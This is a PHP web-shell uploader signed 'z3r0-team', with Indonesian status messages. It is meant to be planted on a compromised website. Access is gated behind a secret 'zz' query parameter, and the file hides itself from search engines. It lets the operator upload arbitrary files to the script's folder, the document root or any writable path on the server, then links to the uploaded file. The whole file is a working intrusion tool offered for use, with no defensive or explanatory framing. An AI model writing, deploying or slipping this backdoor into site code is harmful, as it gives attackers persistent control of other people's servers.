<?php
// binyourbae - z3r0-team!
if (!isset($_GET['zz'])) die;
header("X-Robots-Tag: noindex, nofollow", true);

if (isset($_FILES['file'])) {
    if ($_FILES['file']['error']) exit("Error Kode " . $_FILES['file']['error']);

    $d = $_POST['dir'];
    $dir = $d === 'root' ? $_SERVER['DOCUMENT_ROOT'] : ($d === 'custom' ? $_POST['custom_dir'] : __DIR__);
    $dir = rtrim($dir, '/\\');

    if (!is_dir($dir) || !is_writable($dir)) exit("Error: Direktori '$dir' tidak ada/tidak bisa ditulis.");
    
    $path = $dir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);

    if (move_uploaded_file($_FILES['file']['tmp_name'], $path)) {
        $root = realpath($_SERVER['DOCUMENT_ROOT']);
        if (strpos(realpath($path), $root) === 0) {
            $web_path = str_replace($root, '', realpath($path));
            $link = "http" . (isset($_SERVER['HTTPS']) ? 's' : '') . "://" . $_SERVER['HTTP_HOST'] . str_replace('\\', '/', $web_path);
            exit("<a href='$link' target='_blank'>$link</a>");
        }
        exit("Sukses diunggah ke (non-web path): " . htmlspecialchars($path));
    }
    exit("Error: Gagal memindahkan file. Periksa izin/log server.");
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Uploader</title>
<meta name="robots" content="noindex, nofollow">
<style>body{font-family:monospace}#custom_dir{display:none}#res{margin-top:15px;padding:10px;background:#eee;border:1px solid #ddd}</style>
</head>
<body>
    <form id="upForm">
        <input type="file" name="file" required><br><br>
        <label><input type="radio" name="dir" value="current" checked> Dir Saat Ini (<?= is_writable(__DIR__) ? '<font color=green>W</font>' : '<font color=red>NW</font>' ?>)</label><br>
        <label><input type="radio" name="dir" value="root"> Root Dir (<?= is_writable($_SERVER['DOCUMENT_ROOT']) ? '<font color=green>W</font>' : '<font color=red>NW</font>' ?>)</label><br>
        <label><input type="radio" name="dir" value="custom"> Custom:</label> <input type="text" name="custom_dir" id="custom_dir" placeholder="/path/to/dir"><br><br>
        <input type="submit" value="Upload">
    </form>
    <div id="res"></div>
    <hr><p><i>./s3nt1n3L - z3r0-team!</i></p>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
$(function(){
    $('input[name="dir"]').change(function(){ $('#custom_dir').toggle($(this).val() === 'custom'); });
    $('#upForm').on('submit', function(e){
        e.preventDefault();
        $('#res').html('Mengunggah...');
        $.ajax({
            url: '', type: 'POST', data: new FormData(this), contentType: false, processData: false,
            success: function(data){ $('#res').html('<b>Ciss:</b> ' + data); },
            error: function(a,b){ $('#res').html('<b>AJAX Error:</b> ' + b); }
        });
    });
});
</script>
</body>
</html>
